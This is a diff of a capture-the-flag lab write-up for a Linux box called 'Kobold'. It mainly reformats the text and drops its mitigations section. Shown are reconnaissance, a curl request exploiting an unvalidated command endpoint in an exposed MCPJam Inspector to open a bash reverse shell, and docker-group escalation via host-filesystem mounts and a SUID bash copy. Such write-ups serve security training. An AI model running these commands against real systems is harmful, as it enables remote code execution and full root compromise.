@@ -3,9 +3,9 @@ title: Kobold
 os: Linux
 difficulty: Easy
 tags:
-  - Model Context Protocol
-  - MCPJam Inspector
-  - Docker Group Privilege Escalation
+  - mcp-inspector
+  - Docker SUID shell
+  - Privilege Escalation
   - CVE-2026-23744
 ---
 
@@ -27,15 +27,14 @@ tags:
 
 ---
 
-```text
-\------------------------------------------------------------------------------------Kobold-Notes--------------------------------------------------------------------------------------------
-```
 
 ## Step 1 - Reconnaissance
 
 ```bash
 nmap -A -sS -P -T4  --min-rate 5000 10.129.12.117
+```
 
+```text
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-22 12:58 UTC
 
 Nmap scan report for 10.129.12.117
@@ -165,14 +164,16 @@ Progress: 19966 / 19967 (99.99%)
 ===============================================================
 
 Finished
+```
 
-python3 dirsearch.py -u "https://kobold.htb/" -x 404  
+```bash
+python3 dirsearch.py -u "https://kobold.htb/" -x 404
+```
 
-&#x20; _|. _ _  _  _  _ _|_    v0.4.3                 
+```text
+_|. _ _  _  _  _ _|_    v0.4.3                 
 
-&#x20;(_||| _) (/_(_|| (_| )                          
-
-&#x20;                                                
+ (_||| _) (/_(_|| (_| )                          
 
 Extensions: php, asp, aspx, jsp, html, htm
 
@@ -200,18 +201,17 @@ KoboldAI is a browser-based front-end for AI-assisted writing and text generatio
 
 - 🔍 *also there is one subdomain as well*
 
+> [!IMPORTANT]
+> mcp.kobold.htb
+
 ```text
-&#x20;[!] mcp.kobold.htb 
+MCP stands for Model Context Protocol - this is a protocol for AI model interactions, often used with:
 
-&#x09;MCP stands for Model Context Protocol - this is a protocol for AI model interactions, often used with:
+		KoboldAI (a text generation AI interface)
 
-&#x09;	KoboldAI (a text generation AI interface)
+		LLM (Large Language Model) servers
 
-&#x09;
-
-&#x09;	LLM (Large Language Model) servers
-
-&#x09;	AI model management platforms
+		AI model management platforms
 ```
 
 - 🔍 *the reason why didn't saw it in the gobuster is because the wordlist is old and does not contains new ai related subdomains.*
@@ -222,11 +222,11 @@ KoboldAI is a browser-based front-end for AI-assisted writing and text generatio
 > What is MCPJam Inspector?
 
 ```text
-&#x09;A tool for developing/debugging MCP servers (AI model servers)
+A tool for developing/debugging MCP servers (AI model servers)
 
-&#x09;By default, it listens on 0.0.0.0 (all network interfaces) instead of 127.0.0.1 (localhost only)
+	By default, it listens on 0.0.0.0 (all network interfaces) instead of 127.0.0.1 (localhost only)
 
-&#x09;This means it's accessible remotely
+	This means it's accessible remotely
 ```
 
 - 🔍 *while looking for some know vulnerabilities for this, i have found*
@@ -235,22 +235,18 @@ KoboldAI is a browser-based front-end for AI-assisted writing and text generatio
 > The RCE Vulnerability (CVE-2026-23744):
 
 ```text
-&#x09;The /api/mcp/connect endpoint accepts a serverConfig object that includes:
+The /api/mcp/connect endpoint accepts a serverConfig object that includes:
 
-&#x09;command: What program to run
+	command: What program to run
 
-&#x09;args: Arguments to pass to that program
+	args: Arguments to pass to that program
 
-&#x09;env: Environment variables
+	env: Environment variables
 
-&#x09;The flaw: No validation is performed on these fields. An attacker can send ANY command, and the server will execute it!
+	The flaw: No validation is performed on these fields. An attacker can send ANY command, and the server will execute it!
 ```
 
 - 🔍 *Hence we got all we need, lets grab the initial foothold.*
-
-```text
-\-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-```
 
 ## Step 2 - Initial Foothold
 
@@ -263,23 +259,23 @@ KoboldAI is a browser-based front-end for AI-assisted writing and text generatio
 ```bash
 curl -k -X POST "https://mcp.kobold.htb/api/mcp/connect" \\
 
-&#x20; -H "Content-Type: application/json" \\
+  -H "Content-Type: application/json" \\
 
-&#x20; -d '{
+  -d '{
 
-&#x20;   "serverConfig": {
+    "serverConfig": {
 
-&#x20;     "command": "/bin/bash",
+      "command": "/bin/bash",
 
-&#x20;     "args": ["-c", "bash -i >& /dev/tcp/10.10.14.11/4444 0>&1"],
+      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.11/4444 0>&1"],
 
-&#x20;     "env": {}
+      "env": {}
 
-&#x20;   },
+    },
 
-&#x20;   "serverId": "exploit"
+    "serverId": "exploit"
 
-&#x20; }'
+  }'
 ```
 
 - 🔍 *on the listener!*
@@ -294,15 +290,13 @@ connect to [10.10.14.11] from (UNKNOWN) [10.129.12.117] 54016
 bash: cannot set terminal process group (1529): Inappropriate ioctl for device
 
 bash: no job control in this shell
+```
 
+```bash
 ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
 ```
 
 - 🔍 *its ben, so go grab the user flag from, ben's directory*
-
-```text
-\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-```
 
 ## Step 3 - Privilege Escalation
 
@@ -316,7 +310,9 @@ ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
 newgrp docker
 
 docker run -v /:/hostfs --rm --user root --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt
+```
 
+```text
 * \-v /:/hostfs - Mounts the entire host filesystem to /hostfs inside the container
 
 * \--rm - Removes container after execution
@@ -328,86 +324,89 @@ docker run -v /:/hostfs --rm --user root --entrypoint cat privatebin/nginx-fpm-a
 * privatebin/nginx-fpm-alpine:2.0.2 - The Docker image being used
 
 * /hostfs/root/root.txt - The file to read
+```
 
-ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ newgrp docker
+```bash
+newgrp docker
+docker run -v /:/hostfs --rm --user root --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt
+```
 
-docker run -v /:/hostfs --rm --user root --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txtnewgrp docker
-
-**cc9acf6bd57c6d1caa7dfe72453554d2**
+```text
+cc9acf6bd57c6d1caa7dfe72453554d2
 ```
 
 - 🔍 *this way you can directly read the whole file system without even gaining any privileges.*
 
-- 🔍 *If aren't satisfied enough with getting a flag, and you wanna gain a shell, then--->*
+- 🔍 *If aren't satisfied enough with getting a flag, and you wanna gain a shell, then:*
 
 ```bash
 newgrp docker
-
-docker run -v /:/hostfs --rm --user root --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2 -c "cp /hostfs/bin/bash /hostfs/tmp/rootbash && chmod +s /hostfs/tmp/rootbash
-
+docker run -v /:/hostfs --rm --user root --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2 -c "cp /hostfs/bin/bash /hostfs/tmp/rootbash && chmod +s /hostfs/tmp/rootbash"
 /tmp/rootbash -p
 ```
 
-- 🔍 *while i was trying this shell copy thing, it was taking to long and got stuck in between, maybe cause of my low main memory.*
+- 🔍 *While trying this shell copy thing, it was taking too long and got stuck in between, maybe due to low memory.*
 
-- 🔍 *made it work though!*
+- 🔍 *Made it work though!*
 
-```text
+```bash
 ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ newgrp docker
 
 newgrp docker
+```
 
+```text
 $ls
 
-&#x09;LICENSE
+	LICENSE
 
-&#x09;README.md
+	README.md
 
-&#x09;assets
+	assets
 
-&#x09;bin
+	bin
 
-&#x09;dist
+	dist
 
-&#x09;node_modules
+	node_modules
 
-&#x09;package.json
+	package.json
 
 $docker run -v /:/hostfs --rm --user root --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2 -c "cp /hostfs/bin/bash /hostfs/tmp/rootbash && chmod +s /hostfs/tmp/rootbash"
 
 $ls
 
-&#x09;LICENSE
+	LICENSE
 
-&#x09;README.md
+	README.md
 
-&#x09;assets
+	assets
 
-&#x09;bin
+	bin
 
-&#x09;dist
+	dist
 
-&#x09;node_modules
+	node_modules
 
-&#x09;package.json
+	package.json
 
 $/tmp/rootbash -p
 
 $ls
 
-&#x09;LICENSE
+	LICENSE
 
-&#x09;README.md
+	README.md
 
-&#x09;assets
+	assets
 
-&#x09;bin
+	bin
 
-&#x09;dist
+	dist
 
-&#x09;node_modules
+	node_modules
 
-&#x09;package.json
+	package.json
 
 #whoami
 
@@ -415,44 +414,3 @@ root
 ```
 
 - 🔍 *i have used indentation and ls just to let myself know that i am still in the container or not, because i was seeing nothing, complete blank. and got scared! that's why had to use ls as a test to reassure!*
-
-## Mitigations & Security Perspective
-
-> [!IMPORTANT]
-> **🛡️ Blue Team Infrastructure & Container Security Assessment**
-> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Kobold environment. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.
-
-### 🔴 Unauthenticated Command Execution in MCPJam Inspector (CVE-2026-23744)
-
-> [!WARNING]
-> **Vulnerability Profile:**
-> The Model Context Protocol (MCP) debugging portal, MCPJam Inspector, was exposed to all network interfaces (`0.0.0.0`) on the subdomain `mcp.kobold.htb`. The `/api/mcp/connect` endpoint accepts a `serverConfig` block with user-defined commands and arguments and executes them without validation.
-
-> [!CAUTION]
-> **Risk & Downstream Threat Impact:**
-> Exposing internal development, testing, or debugging tools directly to external networks allows attackers to gain arbitrary code execution (RCE) on the server. Since the API does not validate the program or arguments passed in the connection configuration, an external user can easily inject reverse shells, running in the context of the service user (`ben`).
-
-> [!TIP]
-> **Defensive Remediation & Detection Strategies:**
-> - **Remediation:** Bind local debugging tools exclusively to `127.0.0.1` (localhost).
-> - **Remediation:** If external access is necessary, place the portal behind a reverse proxy (e.g., Nginx) that enforces strong authentication (such as mTLS or OAuth).
-> - **Detection:** Set up detection rules for outbound network calls initiated by server-side Javascript node modules or developer processes (like `@mcpjam/inspector`).
-
----
-
-### 🔴 Insecure Docker Group Privilege Delegation
-
-> [!WARNING]
-> **Vulnerability Profile:**
-> The unprivileged user account `ben` is a member of the local `docker` group, allowing direct access to the Docker socket/daemon.
-
-> [!CAUTION]
-> **Risk & Downstream Threat Impact:**
-> Docker socket access is equivalent to full root access on a host. An attacker with standard shell access under the `docker` group can execute containers mounting the entire host filesystem (`-v /:/hostfs`), read sensitive files (such as `/root/root.txt`), edit system configurations, or write backdoor SUID binaries to execute commands as `root`.
-
-> [!TIP]
-> **Defensive Remediation & Detection Strategies:**
-> - **Remediation:** Remove non-administrative users from the `docker` group.
-> - **Remediation:** Restrict container capabilities. Enforce rootless Docker mode or implement Docker daemon authorization plugins to restrict volume mounts and privileged container execution.
-> - **Detection:** Monitor and alert on Docker commands mounting the host root directory (`/`) or overriding image entrypoints with interactive shells (`/bin/sh` or `/bin/bash`).
-
